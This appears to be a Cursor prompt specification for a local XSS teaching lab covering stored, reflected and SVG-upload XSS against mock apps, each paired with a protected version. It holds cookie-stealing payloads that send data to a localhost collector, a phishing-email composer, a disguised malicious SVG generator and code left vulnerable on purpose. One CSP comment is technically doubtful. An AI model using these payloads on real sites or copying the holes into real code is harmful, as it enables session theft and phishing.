@@ -1,0 +1,905 @@
+# Cursor Prompt: XSS Attack Demo Suite
+
+## Context
+
+Part of the security attack demonstration lab at
+https://github.com/EverythingFromDayOne/demo-attacked-web.
+This demo lives under `demo-attacked/xss/` and covers three distinct XSS variants
+across 9 servers (ports 3001–3009).
+
+Tech stack: Node.js + Express. Vanilla CSS/JS. No TypeScript. No build step.
+All HTML as template literals (server files) or static HTML files. Inline CSS only.
+
+Code comment standards throughout:
+- Intentional vulnerabilities: `// ⚠️ VULNERABILITY: <what and why>`
+- Fixes: `// ✅ FIX: <what was changed and why it works>`
+- No lorem ipsum anywhere — all copy must be realistic SaaS product language.
+
+---
+
+## Port Map
+
+| Port | Server | File |
+|------|--------|------|
+| 3001 | Stored XSS — NovaCRM vulnerable victim | `stored/victim-server.js` |
+| 3002 | Stored XSS — Attacker cookie collector | `stored/attacker-server.js` |
+| 3003 | Reflected XSS — ShopNest vulnerable victim | `reflected/victim-server.js` |
+| 3004 | Reflected XSS — Attacker cookie collector | `reflected/attacker-server.js` |
+| 3005 | SVG Upload XSS — ConnectHub vulnerable victim | `svg-upload/victim-server.js` |
+| 3006 | SVG Upload XSS — Attacker cookie collector | `svg-upload/attacker-server.js` |
+| 3007 | SVG Upload XSS — ConnectHub protected | `svg-upload/victim-server-protected.js` |
+| 3008 | Reflected XSS — ShopNest protected | `reflected/victim-server-protected.js` |
+| 3009 | Stored XSS — NovaCRM protected | `stored/victim-server-protected.js` |
+
+All ports are conflict-free. All 9 servers can run simultaneously.
+
+---
+
+## File Structure
+
+```
+demo-attacked/xss/
+├── stored/
+│   ├── victim-server.js          — NovaCRM vulnerable    — port 3001
+│   ├── attacker-server.js        — Cookie collector      — port 3002
+│   ├── victim-server-protected.js — NovaCRM protected    — port 3009
+│   ├── victim.html               — Customer portal (vulnerable)
+│   ├── admin.html                — Agent dashboard (vulnerable)
+│   ├── victim-protected.html     — Customer portal (protected)
+│   └── package.json
+├── reflected/
+│   ├── victim-server.js          — ShopNest vulnerable   — port 3003
+│   ├── attacker-server.js        — Cookie collector      — port 3004
+│   ├── victim-server-protected.js — ShopNest protected   — port 3008
+│   ├── victim.html               — ShopNest storefront
+│   ├── attacker.html             — Attacker dashboard
+│   └── package.json
+├── svg-upload/
+│   ├── victim-server.js          — ConnectHub vulnerable — port 3005
+│   ├── attacker-server.js        — Cookie collector      — port 3006
+│   ├── victim-server-protected.js — ConnectHub protected — port 3007
+│   ├── victim.html               — ConnectHub community page
+│   ├── attacker.html             — Attack dashboard
+│   └── package.json
+└── README.md
+```
+
+---
+
+# PART 1: Stored XSS — NovaCRM Support Ticket Portal (ports 3001, 3002, 3009)
+
+## Real-World Scenario
+
+**Target:** A B2B SaaS helpdesk portal.
+**Victim role:** Support Agent "John" — authenticated, has a valuable session cookie.
+**Attacker role:** A malicious customer who submits a support ticket.
+**Attack:** Attacker embeds a JavaScript payload in the message body. When Agent John
+opens his dashboard and expands the ticket, the script fires silently and exfiltrates
+his session cookie to the attacker's remote collector.
+
+---
+
+## stored/victim-server.js (port 3001)
+
+An Express server representing the vulnerable helpdesk company.
+
+**Routes:**
+- `GET /` → serves `victim.html`
+- `GET /admin` → serves `admin.html` AND sets a session cookie:
+  `agent_session=AgentJohn_s3ss10n_t0k3n_XYZ789; Path=/; HttpOnly=false`
+  Comment: `// ⚠️ VULNERABILITY: httpOnly: false — JavaScript can read this cookie via document.cookie`
+  `// ✅ FIX: Set httpOnly: true (see victim-server-protected.js)`
+- `POST /api/tickets` → accepts JSON body `{ name, email, subject, message }`.
+  Stores in-memory. Does NOT sanitize. Comment:
+  `// ⚠️ VULNERABILITY: raw user input stored and later rendered as HTML`
+- `GET /api/tickets` → returns all tickets JSON, reverse chronological order.
+- Serves static files from the `stored/` directory.
+
+**Startup:** Pre-seed 2 legitimate tickets:
+- Alice Chen, "Cannot export CSV report" — normal plain-text message
+- Bob Martinez, "Billing invoice discrepancy" — normal plain-text message
+
+---
+
+## stored/attacker-server.js (port 3002)
+
+**Routes:**
+- `GET /steal` → reads `req.query.c` (stolen cookie), stores with timestamp,
+  responds with 1×1 transparent GIF (`Content-Type: image/gif`).
+  Console: `[STOLEN] Cookie received: <value>`
+- `GET /api/stolen` → returns JSON array of all stolen cookies with timestamps.
+- `GET /` → serves `attacker.html`.
+
+CORS: enable for all origins.
+
+---
+
+## stored/victim.html — Customer Support Portal (NovaCRM)
+
+Design: Clean professional SaaS look. Blue/white color scheme. Company: "NovaCRM".
+Header: logo, nav (Home, Docs, Status).
+
+**Yellow demo banner at top:**
+`⚠️ Demo: Your session cookie is: <document.cookie dynamically rendered here>`
+
+**Section 1 — Submit a Ticket form:**
+Fields: Full Name, Email, Subject, Message (textarea, 4 rows).
+Submit via `fetch POST /api/tickets`. On success: green banner "Your ticket has been
+submitted. We'll respond within 24h." Clear form after submit.
+
+**Section 2 — Recent Community Tickets:**
+Poll `GET /api/tickets` on load and every 3 seconds.
+Each ticket as a card: submitter name, subject, message body.
+
+**CRITICAL — THE VULNERABILITY:**
+```js
+// ⚠️  VULNERABILITY: innerHTML renders raw HTML — never do this with user input
+// Safe alternative: element.textContent = ticket.message
+message.innerHTML = ticket.message;
+```
+
+---
+
+## stored/admin.html — Agent Dashboard (NovaCRM)
+
+Design: Dark sidebar layout. Sidebar: agent avatar "JD", name "Agent John Doe",
+role badge "Support Agent", org "NovaCRM Internal".
+
+**On page load:**
+- Fetch `GET /api/tickets` and render the ticket list.
+- Yellow info banner: `⚠️ Demo: Your session cookie is: <document.cookie dynamically>`
+
+**Ticket list:**
+Each ticket: submitter name, subject, "View" button, timestamp.
+Clicking "View" expands inline panel showing full message body.
+
+**THE VULNERABILITY (same as victim.html):**
+```js
+// ⚠️  VULNERABILITY: innerHTML renders raw HTML — never do this with user input
+// Safe alternative: element.textContent = ticket.message
+message.innerHTML = ticket.message;
+```
+
+**Note on meta.innerHTML:** The `meta.innerHTML` line (rendering ticket.name + timestamp)
+is ALSO vulnerable — name field is injectable. Use safe DOM construction instead:
+- Create `<span class="name">`, set `textContent = ticket.name`
+- Create `<span class="time">`, set `textContent = relativeTime(ticket.createdAt)`
+- Append both to `meta`
+
+---
+
+## stored/victim-server-protected.js (port 3009)
+
+Copy victim-server.js structure, apply all fixes.
+
+**How-to-run comment block at top:**
+```
+Terminal 1: cd demo-attacked/xss/stored && npm run victim-protected
+Terminal 2: cd demo-attacked/xss/stored && npm run attacker
+```
+
+**Fix 1 — Cookie httpOnly: true:**
+```js
+// ✅ FIX: httpOnly: true — document.cookie cannot read this token.
+//    Even if XSS fires, document.cookie returns '' for this field.
+res.cookie('agent_session', 'AgentJohn_s3ss10n_t0k3n_XYZ789', { path: '/', httpOnly: true })
+```
+
+**Fix 2 — Input sanitization before storing:**
+```js
+// ✅ FIX: Sanitize at ingestion point — strip HTML tags before storing.
+//    Defense-in-depth: even if the rendering layer has a bug, the data is clean.
+//    Real production: use 'sanitize-html' or 'dompurify' (via jsdom) for allowlists.
+const sanitizeText = (str) => String(str).replace(/<[^>]*>/g, '').trim();
+const ticket = {
+  name: sanitizeText(name),
+  email: sanitizeText(email),
+  subject: sanitizeText(subject),
+  message: sanitizeText(message),
+};
+```
+
+**Fix 3 — CSP header on all responses:**
+```js
+// ✅ FIX: Content Security Policy as last-resort layer.
+//    'script-src self' blocks inline scripts and scripts from other origins.
+//    Note: onerror= and onload= event handlers are NOT blocked without 'unsafe-inline'
+//    explicitly denied AND a nonce-based policy. CSP is defense-in-depth, not the primary fix.
+res.setHeader('Content-Security-Policy',
+  "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'");
+```
+
+Serves `victim-protected.html` for `/` and `/admin` routes.
+
+**Add to stored/package.json:**
+```json
+{
+  "name": "xss-stored-demo",
+  "scripts": {
+    "victim":           "node victim-server.js",
+    "attacker":         "node attacker-server.js",
+    "victim-protected": "node victim-server-protected.js"
+  },
+  "dependencies": { "express": "*", "cors": "*", "uuid": "*" }
+}
+```
+
+---
+
+## stored/victim-protected.html
+
+Copy `victim.html` with these changes only:
+
+1. Title: `NovaCRM — Customer Support [Protected]`
+
+2. Green banner at top (above header):
+   ```
+   ✅ Protected version — innerHTML replaced with textContent. XSS payloads render
+   as plain text. Session cookie is HttpOnly.
+   ```
+   Style: green background (`#dcfce7`), dark green text (`#166534`).
+
+3. Fix `meta.innerHTML` — use safe DOM construction (same as admin.html fix above).
+
+4. Fix message rendering:
+   ```js
+   // ✅ FIX: textContent — browser treats value as plain text, never parses as HTML.
+   //    An XSS payload like <img onerror="..."> is displayed literally as text on screen.
+   message.textContent = ticket.message;
+   ```
+
+5. No other changes. Keep all CSS, layout, form, and polling logic identical.
+
+---
+
+## stored/attacker.html — Cookie Collector Dashboard
+
+Design: Dark terminal aesthetic. Black background, green monospace font.
+Title: "Cookie Collector — Waiting for victims..."
+
+**Behavior:**
+- Poll `GET /api/stolen` (port 3002) every 1.5 seconds
+- While empty: blinking cursor animation + "Listening on port 3002..."
+- When cookie arrives: green glow animation, display:
+  ```
+  [COOKIE CAPTURED] 2026-06-09 14:32:01
+  agent_session=AgentJohn_s3ss10n_t0k3n_XYZ789
+  ```
+- Newest at top. Counter: "Cookies stolen: N"
+
+**Attack payload instructions panel (bottom of page):**
+Gray box labeled "Attack Payload Used:" showing the img onerror XSS payload to copy-paste
+into the victim form. Exact values:
+- Name: `Attacker`
+- Subject: `Having trouble logging in`
+- Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
+
+Show in a styled `<pre>` code block.
+
+**Victim switcher (bottom-left, fixed position):**
+```css
+position: fixed; bottom: 1rem; left: 1rem; display: flex; gap: 0.5rem; z-index: 9999;
+```
+- `Vulnerable (:3001)` — dark button (`#1e293b` bg, white text, `#334155` border)
+- `Protected (:3003)` — red button
+
+Wait — **stored XSS protected is port 3009, NOT 3003**. The switcher here should be:
+- `Vulnerable (:3001)` → opens localhost:3001 in new tab
+- `Protected (:3009)` → opens localhost:3009 in new tab
+
+Clicking either button opens the corresponding victim in a new tab. Active button reflects
+whichever was clicked last (cosmetic highlight only).
+
+---
+
+# PART 2: Reflected XSS — ShopNest Search Page (ports 3003, 3004, 3008)
+
+## Real-World Scenario
+
+**Target:** ShopNest — a mid-size e-commerce platform.
+**Victim:** Logged-in customer "Jane" browsing for products. Has a session cookie.
+**Attack chain:**
+1. Attacker crafts a malicious search URL with a JS payload in the `?q=` param.
+2. Attacker wraps the URL in a convincing phishing email.
+3. Jane clicks the link, lands on ShopNest's `/search` page.
+4. Server echoes `?q=` into the HTML response. Browser executes the script.
+5. Jane's session cookie is silently sent to the attacker's collector.
+
+Critical distinction from Stored XSS: the payload is never saved to a database.
+It lives only in the URL, is reflected once by the server, fires, then disappears.
+
+---
+
+## reflected/victim-server.js (port 3003)
+
+**Cookie setup:**
+On every request, if `shopper_session` cookie not already set:
+`shopper_session=ShopperJane_t0k3n_ABC456; Path=/`
+No HttpOnly. Comment: `// ⚠️ VULNERABILITY: HttpOnly omitted — JS can read this cookie`
+
+**Routes:**
+
+`GET /` → serves `victim.html` as a static file.
+
+`GET /search` → **THE VULNERABLE ROUTE**. Reads `req.query.q`. Builds HTML string
+by interpolating the RAW query value directly — no sanitization.
+
+The reflected value must appear in TWO places:
+```js
+// ⚠️ VULNERABILITY: Server-Side Reflection — payload embedded in HTML before browser
+// receives the response. The browser parses this as legitimate HTML, not injected content.
+// ✅ FIX: HTML-encode req.query.q before interpolation.
+`<title>ShopNest — Search: ${q}</title>`
+`<h2>Search results for: ${q}</h2>`
+```
+
+The search results page must look real — same header/nav as victim.html,
+4-6 fake product cards below the heading (hardcoded), "Showing N results" count.
+
+`GET /api/products` → returns JSON array of 6 realistic products (electronics,
+clothing, home goods). Each: id, name, price, category, rating, imageEmoji.
+
+**Startup log:**
+```
+ShopNest victim server running on http://localhost:3003
+Vulnerable route: http://localhost:3003/search?q=<YOUR_PAYLOAD>
+```
+
+---
+
+## reflected/attacker-server.js (port 3004)
+
+**Routes:**
+
+`GET /steal` → read `req.query.c`, store with timestamp, respond with 1×1
+transparent GIF + `Cache-Control: no-store`.
+
+`GET /api/stolen` → returns JSON array of stolen cookies, newest first.
+
+`GET /` → serves `attacker.html`.
+
+CORS: enable for all origins.
+
+**Pre-generate and log malicious URLs on startup:**
+```
+=== ATTACK URLS (copy into phishing email) ===
+[Script tag]  http://localhost:3003/search?q=<script>...</script>
+[IMG onerror] http://localhost:3003/search?q=<img src=x onerror=...>
+```
+
+---
+
+## reflected/victim.html — ShopNest Storefront
+
+Design: Clean modern e-commerce. White background, deep teal (`#0d6e6e`) header.
+Logo: "ShopNest 🛒".
+
+Header: Logo left, nav center (Categories, Deals, New Arrivals, Help), cart + account right.
+
+**Yellow demo banner:** `⚠️ Demo: Your session cookie is: <document.cookie dynamically>`
+
+**Hero search bar:** Large centered search input + "Search" button.
+On submit, navigates to `/search?q=<input value>` via GET form action.
+
+Product grid below: fetch `GET /api/products`, render 6 product cards
+(emoji, name, price, star rating, "Add to Cart" button).
+
+`victim.html` is a static file — it has no XSS. The vulnerability is entirely
+in the server-rendered `/search` route.
+
+---
+
+## reflected/victim-server-protected.js (port 3008)
+
+**Port: 3008** (NOT 3005 — that conflicts with svg-upload).
+
+HTML-encode all `req.query.q` values before interpolation:
+
+```js
+function htmlEncode(str) {
+  return String(str).replace(/[&<>"']/g, (c) =>
+    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])
+  );
+}
+
+// In the /search handler:
+const rawQ = req.query.q || '';
+const q = htmlEncode(rawQ);  // encode first, use only encoded value below
+```
+
+Green demo banner: `✅ PROTECTED: htmlEncode applied to req.query.q before interpolation`
+
+Update all console.log messages to reference port 3008.
+
+**Add to reflected/package.json:**
+```json
+{
+  "name": "xss-reflected-demo",
+  "scripts": {
+    "victim":           "node victim-server.js",
+    "attacker":         "node attacker-server.js",
+    "victim-protected": "node victim-server-protected.js"
+  },
+  "dependencies": { "express": "*", "cors": "*" }
+}
+```
+
+---
+
+## reflected/attacker.html — Attacker Dashboard
+
+Design: Split two equal panels side by side.
+
+### Left panel — Phishing Email Composer
+
+Title: "Step 1: Craft the Lure"
+
+A form:
+- Input: "Product / Search Term" (e.g., "wireless headphones")
+- Dropdown: "Email Template" — options: "Deal Alert", "Saved Search Update", "Price Drop"
+- Button: "Generate Phishing Email"
+
+On click, render a realistic fake email in a styled email-client preview:
+- From: deals@shopnest-alerts.com
+- Subject: matches template
+- ShopNest logo + branding
+- Product teaser section with fake product names
+- Prominent CTA button "View Your Results →" — `href` is the malicious URL
+- Fine print with fake unsubscribe link
+
+"Raw URL" field below the email preview showing the malicious URL for inspection.
+
+Two tabs for payload variants: "Script Tag" and "IMG onerror".
+
+The malicious URL generator is **client-side only** (no server fetch):
+```js
+const ATTACKER_PORT = 3004;
+let victimPort = 3003;  // default: vulnerable
+
+function buildImgPayload() {
+  return `<img src=x onerror="new Image().src='http://localhost:${ATTACKER_PORT}/steal?c='+encodeURIComponent(document.cookie)">`;
+}
+
+function buildAttackUrl() {
+  return `http://localhost:${victimPort}/search?q=${encodeURIComponent(buildImgPayload())}`;
+}
+```
+
+**Victim switcher (bottom-left, fixed):**
+- `Vulnerable (:3003)` → sets `victimPort = 3003`, refreshes the payload display
+- `Protected (:3008)` → sets `victimPort = 3008`, refreshes payload display
+
+When switching to Protected (:3008), add a note next to the URL:
+`"⚠️ Protected server — payload will render as plain text (htmlEncode applied)"`
+
+### Right panel — Cookie Collector
+
+Title: "Step 2: Wait for the Victim"
+
+Poll `GET /api/stolen` (port 3004) every 1.5 seconds.
+Same blinking cursor / green flash / cookie display as stored XSS attacker.
+Counter: "Cookies stolen: N"
+
+Attack flow instructions at the bottom (numbered steps 1-5).
+
+---
+
+# PART 3: SVG Upload XSS — ConnectHub Profile Platform (ports 3005, 3006, 3007)
+
+## Real-World Scenario
+
+**Target:** ConnectHub — a professional networking platform.
+**Victim:** "Sarah Chen", logged-in user browsing member profiles.
+**Critical lesson:** ConnectHub's HTML files contain ZERO innerHTML, ZERO reflected params.
+The frontend developer did everything right. The hole is the file-serving policy.
+
+**Attack chain:**
+1. Attacker crafts a malicious SVG file with an embedded `<script>` tag.
+2. Attacker uploads it as their ConnectHub profile avatar.
+3. Server stores SVG under `/uploads/` and serves it statically — no Content-Disposition, no CSP.
+4. In the community grid, the avatar shows as a normal image — `<img>` sandboxes SVG scripts.
+5. Sarah clicks "View Profile" on the attacker's card. A modal opens.
+6. She clicks "🔍 View Full Photo" — opens the raw SVG URL in a new tab.
+7. Browser renders SVG as a standalone document. Same origin as localhost:3005. Script fires.
+8. Sarah's session cookie is silently exfiltrated.
+
+---
+
+## svg-upload/victim-server.js (port 3005)
+
+**Cookie setup:**
+On every request, if `member_session` not set:
+`member_session=MemberSarah_t0k3n_DEF012; Path=/`
+No HttpOnly. Comment: `// ⚠️ VULNERABILITY: HttpOnly omitted — JS can read this cookie`
+
+**Multer setup:**
+Use multer with diskStorage. Store in `./uploads/`. Create `uploads/` on startup
+with `fs.mkdirSync`.
+
+File filter: **accept ALL file types including .svg** — do NOT restrict.
+```js
+// ⚠️ VULNERABILITY: No file type restriction — SVG files accepted as "images"
+// ✅ FIX: Whitelist only safe raster formats: jpg, jpeg, png, gif, webp
+//         SVG must never be accepted without server-side sanitization
+```
+
+Filename: timestamp prefix + original filename.
+
+**Routes:**
+
+`GET /` → serves `victim.html`.
+
+`GET /profile/:filename` → serves `victim.html` (SPA-style).
+
+`POST /api/upload` → handles avatar upload via multer. After upload, store profile:
+`{ id, username, bio, avatarUrl: '/uploads/<filename>', uploadedAt }`
+NO validation of file content. Comment:
+```js
+// ⚠️ VULNERABILITY: File content not inspected — SVG with <script> stored and served as-is
+// ✅ FIX: For SVGs, parse and strip all <script> tags and event handlers before saving.
+```
+
+`GET /api/profiles` → returns all profiles JSON, newest first.
+Pre-seed 3 profiles on startup (null avatarUrl):
+- Priya Sharma, "Product Designer at Fintech startup. Dog lover."
+- Marcus Webb, "Backend engineer. Coffee → code."
+- Yuki Tanaka, "UX researcher. Ask me about usability testing."
+
+`GET /uploads/*` → serve uploads directory statically with NO additional headers.
+```js
+// ⚠️ VULNERABILITY: Uploaded files served with no Content-Disposition or CSP header.
+//    When a browser opens an SVG URL directly, it renders it as a full XML document
+//    with JavaScript execution in the same origin as this server.
+// ✅ FIX (Option A): res.setHeader('Content-Disposition', 'attachment')
+//    Content-Disposition: attachment forces download — browser never executes the SVG.
+// ✅ FIX (Option B): res.setHeader('Content-Security-Policy', "default-src 'none'")
+//    Blocks all script execution inside the SVG even when opened as a document.
+app.use('/uploads', express.static(UPLOADS_DIR));
+```
+
+`GET /api/profiles/:id` → returns single profile by id.
+
+---
+
+## svg-upload/attacker-server.js (port 3006)
+
+**Routes:**
+
+`GET /steal` → read `req.query.c`, store with timestamp, respond with 1×1 GIF.
+Log: `[STOLEN] Cookie: <value>`.
+
+`GET /api/stolen` → returns JSON array of stolen cookies, newest first.
+
+`GET /` → serves `attacker.html`.
+
+`GET /payload.svg` → dynamically generates and returns the malicious SVG file.
+The SVG must:
+- Be valid SVG (viewBox, namespace, visible colored element)
+- Contain a `<script>` tag that exfiltrates `document.cookie` to port 3006 `/steal`
+- Use `encodeURIComponent(document.cookie)` and `new Image()` technique (avoids CORS preflight)
+- Visible element: teal gradient rectangle in ConnectHub color scheme — looks like a
+  custom colored avatar, not an obviously malicious file
+
+`Content-Type: image/svg+xml` on this response.
+
+CORS: enable for all origins.
+
+---
+
+## svg-upload/victim.html — ConnectHub Community Page
+
+Design: Professional networking site. White/slate. Deep teal (`#1e6b6b`) header.
+Logo: "ConnectHub 🔗".
+
+Header: Logo, nav (Home, Network, Jobs, Messages). Right: notification bell,
+"Sarah Chen" with "SC" initials.
+
+**Yellow demo banner:** `⚠️ Demo: Sarah's session cookie: <document.cookie dynamically>`
+
+**Two-column layout:**
+
+Left column (30%) — "Your Profile" card:
+- Sarah Chen's name, "Member" badge
+- Default "SC" initials avatar
+- "Upload Profile Photo" section — file input (accept: `"image/*,.svg"`)
+- Note: "Supported: JPG, PNG, GIF, SVG" — makes SVG support explicit
+- On file select, POST to `/api/upload` via FormData (field: `avatar`)
+- On success: reload profile grid
+
+Right column (70%) — "Community Members" grid:
+- Fetch `GET /api/profiles` on load and after upload
+- Each profile card: `<img src="avatarUrl">` (SAFE — browsers sandbox SVG in img),
+  name, bio excerpt, "View Profile →" link
+- Null avatarUrl: show gray circle with first letter
+
+**Profile modal** (on "View Profile →" click):
+- Large avatar via `<img>` (still safe)
+- Full name, bio, member since
+- Teal button: "🔍 View Full Photo":
+  ```js
+  // ⚠️ VULNERABILITY: Opening the raw SVG URL in a new tab renders it as a
+  //    standalone document in the same origin. Scripts inside the SVG execute.
+  //    The <img> tag above is safe — browsers sandbox SVG scripts inside <img>.
+  //    But window.open() removes that sandbox.
+  // ✅ FIX: Never provide a direct link to user-uploaded SVG files.
+  //         Or ensure the server adds Content-Disposition: attachment.
+  window.open(profile.avatarUrl, '_blank')
+  ```
+- "Connect" button (cosmetic, no function)
+
+**IMPORTANT:** victim.html must use ZERO innerHTML calls with user data.
+All profile data rendered with textContent or safe DOM methods.
+The only unsafe thing is `window.open(profile.avatarUrl)` with its comment.
+
+---
+
+## svg-upload/victim-server-protected.js (port 3007)
+
+Four layers of defense, all applied:
+
+**Layer 1 — Extension and MIME type whitelist:**
+```js
+const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp']);
+const ALLOWED_MIMETYPES = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);
+
+function rasterOnlyFilter(req, file, cb) {
+  const ext = path.extname(file.originalname).toLowerCase();
+  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIMETYPES.has(file.mimetype)) {
+    return cb(new Error('Only JPG, PNG, GIF, and WebP images are allowed.'));
+  }
+  cb(null, true);
+}
+// NOT sufficient alone — attackers rename payload.svg to payload.jpg
+// and send Content-Type: image/jpeg. Client controls both values.
+```
+
+**Layer 2 — Magic bytes check:**
+```js
+function matchesMagicBytes(buffer) {
+  // JPEG: FF D8 FF
+  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) return true;
+  // PNG: 89 50 4E 47
+  if (buffer[0] === 0x89 && buffer[1] === 0x50 && buffer[2] === 0x4e && buffer[3] === 0x47) return true;
+  // GIF: 47 49 46 38
+  if (buffer[0] === 0x47 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x38) return true;
+  // WebP: 52 49 46 46 ... 57 45 42 50
+  if (buffer[0] === 0x52 && buffer[1] === 0x49 && buffer[2] === 0x46 && buffer[3] === 0x46
+      && buffer[8] === 0x57 && buffer[9] === 0x45 && buffer[10] === 0x42 && buffer[11] === 0x50) return true;
+  return false;
+}
+```
+
+**Layer 2b — Content sniff (first 4KB):**
+```js
+function containsExecutableMarkup(buffer) {
+  const head = buffer.slice(0, 4096).toString('utf8').toLowerCase();
+  return head.includes('<?xml') || head.includes('<svg') || head.includes('<script');
+}
+```
+
+**Layer 3 — Sharp re-encoding (definitive polyglot killer):**
+```js
+// ✅ FIX (Layer 3 — definitive polyglot killer):
+//    Re-encode through Sharp. Sharp decodes only the pixel data from the input
+//    and writes a brand-new file. All original bytes (EXIF, comments, embedded
+//    scripts, polyglot payloads) are destroyed — the output contains only clean
+//    pixel data in the target format.
+//
+//    This is the approach used by GitHub, Twitter, and every major platform
+//    that accepts user image uploads.
+const sharp = require('sharp');
+await sharp(filePath).rotate().jpeg({ quality: 85 }).toFile(outputPath);
+fs.unlinkSync(filePath); // delete original
+```
+
+If Sharp fails, delete the file and return 400:
+`"File could not be re-encoded as a safe image. Upload rejected."`
+
+Add `sharp` to `svg-upload/package.json` dependencies.
+
+**Layer 4 — Safe file serving headers:**
+```js
+app.use('/uploads', function (req, res, next) {
+  res.setHeader('Content-Disposition', 'attachment');
+  // Forces browser to download the file instead of rendering it.
+  res.setHeader('Content-Security-Policy', "default-src 'none'");
+  // If somehow rendered, no scripts can execute.
+  next();
+}, express.static(UPLOADS_DIR));
+```
+
+Green demo banner: `✅ PROTECTED: SVG blocked (multer filter + magic bytes + Sharp re-encode + Content-Disposition)`
+
+**Add to svg-upload/package.json:**
+```json
+{
+  "name": "xss-svg-upload-demo",
+  "scripts": {
+    "victim":           "node victim-server.js",
+    "attacker":         "node attacker-server.js",
+    "victim-protected": "node victim-server-protected.js"
+  },
+  "dependencies": { "express": "*", "cors": "*", "multer": "*", "sharp": "*" }
+}
+```
+
+---
+
+## svg-upload/attacker.html — Attack Dashboard
+
+Design: Dark background. Split two-panel layout.
+
+### Left panel — SVG Payload Generator
+
+Title: "Step 1: Craft the Malicious Avatar"
+
+Preview of the malicious SVG rendered as an image (120×120 inline SVG element —
+the same teal gradient rectangle). Label: "This is what your avatar will look like
+— a normal colored image."
+
+Button: "⬇ Download payload.svg" → links to `http://localhost:3006/payload.svg`
+
+Step-by-step instructions:
+```
+Step 1: Download payload.svg above
+Step 2: Go to http://localhost:3005 (ConnectHub)
+Step 3: Upload payload.svg as your profile photo
+Step 4: Your profile appears with a teal avatar — looks normal
+Step 5: Wait for victim to open your profile and click "View Full Photo"
+Step 6: Their cookie appears on the right →
+```
+
+SVG source code in a styled `<pre>` block (fetch from `/payload.svg` and display).
+Label: "SVG Source (what's inside the file you're uploading):"
+
+**Key lesson panel** (info box at bottom of left column):
+```
+WHY THE FRONTEND IS NOT TO BLAME
+
+ConnectHub's HTML uses <img> tags — browsers sandbox SVG scripts inside <img>.
+Sarah's profile page has no innerHTML, no reflected params. The code is clean.
+
+The hole: the server serves /uploads/ as a static directory with no policy.
+When a browser opens an SVG URL directly (not inside <img>), it's treated as
+a full document. Scripts run. Same origin applies. Cookies are readable.
+
+The fix is not a frontend change. It's a one-line server header.
+```
+
+**Victim switcher (bottom-left, fixed):**
+- `Vulnerable (:3005)` → opens localhost:3005 in new tab
+- `Protected (:3007)` → opens localhost:3007 in new tab
+
+### Right panel — Cookie Collector
+
+Title: "Step 2: Wait for the Victim"
+
+Poll `GET http://localhost:3006/api/stolen` every 1.5 seconds.
+Same blinking cursor / green flash / counter pattern as other demos.
+
+---
+
+# PART 4: Comprehensive README (demo-attacked/xss/README.md)
+
+Write professional technical documentation at `demo-attacked/xss/README.md`.
+Structure exactly as follows:
+
+```markdown
+# XSS Attack Demonstration Lab
+
+## Overview
+## Port Reference
+## Attack 1: Stored XSS — NovaCRM Support Ticket Portal
+## Attack 2: Reflected XSS — ShopNest Search Page
+## Attack 3: SVG Upload XSS — ConnectHub Profile Avatar
+## Running All Demos Simultaneously
+## Defense Summary Table
+```
+
+### Section: Overview
+
+Two paragraphs explaining what XSS is at a high level and that this lab covers
+three distinct variants differing in persistence mechanism, delivery vector, and
+attack surface. Clarify that the SVG Upload demo's frontend code is intentionally
+clean to illustrate that XSS is not always a frontend problem.
+
+### Section: Port Reference
+
+Table listing all 9 servers: Port, Server name, File, Status (Vulnerable/Protected).
+
+### Section: Attack 1 — Stored XSS
+
+Include subsections: What It Is, How to Run (10-step numbered list), Vulnerable Code
+(exact lines with js code blocks), Why These Lines Are Dangerous, Payload Variants,
+The Fix (exact lines), Edge Cases and What Still Fails.
+
+**How to Run (exact steps):**
+1. Open two terminals
+2. Terminal 1: `cd demo-attacked/xss/stored && npm run victim`
+3. Terminal 2: `cd demo-attacked/xss/stored && npm run attacker`
+4. Open `http://localhost:3001/admin` first — this sets the agent_session cookie
+5. Open `http://localhost:3002` — attacker dashboard
+6. Open `http://localhost:3001` — customer portal
+7. Submit a ticket with Message: `<img src="x" onerror="new Image().src='http://localhost:3002/steal?c='+encodeURIComponent(document.cookie)">`
+8. Switch to admin dashboard (`localhost:3001/admin`), click "View" on the malicious ticket
+9. The onerror handler fires
+10. Watch the cookie arrive on the attacker dashboard
+
+**Payload Variants (3 variants):**
+1. `<img src="x" onerror="...">` — works even when `<script>` tags are filtered
+2. `<svg onload="...">` — SVG elements fire onload without a src
+3. `<body onpageshow="...">` — fires when page is shown/restored from cache
+
+### Section: Attack 2 — Reflected XSS
+
+Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
+Lines Are Dangerous, The Fix (exact lines), Edge Cases.
+
+Include the note on URL encoding:
+> When you paste the malicious URL into a browser address bar, the browser encodes
+> `<` as `%3C` and `>` as `%3E`. Express automatically URL-decodes `req.query.q`,
+> returning the original `<script>` tag. This is the standard URL decode cycle.
+> It is NOT a bypass — it is how HTTP always works.
+
+### Section: Attack 3 — SVG Upload XSS
+
+Include subsections: What It Is, How to Run, Vulnerable Code (exact lines), Why These
+Lines Are Dangerous, The Fix (4-layer stack), Edge Cases.
+
+**Edge Cases to include:**
+- `<object>` and `<embed>` are NOT sandboxed like `<img>` — audit all file-loading elements
+- Extension whitelist bypassed by polyglot files — Sharp re-encoding is the only reliable defense
+- Content-Disposition: attachment is browser-dependent — users can sometimes bypass it
+- Separate cookieless domain is the strongest architectural defense (GitHub: `avatars.githubusercontent.com`)
+
+### Section: Running All Demos Simultaneously
+
+Table showing all 9 servers (6 npm commands), ports, and that all can run at the same time.
+
+### Section: Defense Summary Table
+
+Columns: Attack Type | Vulnerable Line | Fix | Residual Risk
+
+Minimum 12 rows covering stored innerHTML, name field, cookie, input sanitization,
+reflected SSR, reflected cookie, SVG upload filter, magic bytes, polyglot, serving
+Content-Disposition, serving CSP, and separate CDN domain.
+
+---
+
+# PART 5: Global Code Quality Standards
+
+Apply to all files in demo-attacked/xss/:
+
+- Every intentional vulnerability: `// ⚠️ VULNERABILITY:` with explanation
+- Every fix: `// ✅ FIX:` directly below
